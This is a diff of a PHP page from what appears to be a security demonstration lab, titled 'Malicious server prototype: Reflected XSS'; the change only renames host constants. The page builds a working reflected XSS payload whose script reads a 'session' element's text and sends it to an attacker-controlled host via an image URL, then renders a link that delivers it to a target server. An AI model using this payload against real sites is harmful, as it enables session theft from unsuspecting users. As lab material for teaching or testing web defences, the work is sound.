@@ -5,9 +5,9 @@ include('../declare.php');
 $ua = $_SERVER['HTTP_USER_AGENT'];
 if (strpos($ua, 'Chrome') > -1) {
   // So just inject an image.
-  $value = urlencode("<img src='".MALHOST."images/attack.png' />");
+  $value = urlencode("<img src='".MALROOT."images/attack.png' />");
 } else {
-  $value = urlencode("<script>var d=document;var e=d.getElementById('session');var i=d.createElement('img');i.src='".MALHOST."images/attack.png?'+encodeURIComponent(e.textContent);e.appendChild(i);</script>");
+  $value = urlencode("<script>var d=document;var e=d.getElementById('session');var i=d.createElement('img');i.src='".MALROOT."images/attack.png?'+encodeURIComponent(e.textContent);e.appendChild(i);</script>");
 }
 
 $title = "Malicious server prototype: Reflected XSS";
@@ -16,11 +16,11 @@ include('../inc/header.php');
 <h1>Reflected XSS</h1>
 <p class="instructions">
 Clicking on this link will trigger a reflected XSS attack on the target server:
-<a href="<?=TGTHOST?>reflected/target?value=<?=$value?>">attack</a>
+<a href="<?=TGTROOT?>reflected/target?value=<?=$value?>">attack</a>
 </p>
 <?
 $links = array(
-  'reflected XSS start' => TGTHOST."reflected/start",
+  'reflected XSS start' => TGTROOT."reflected/start",
 );
 include('../inc/footer.php');
 ?>
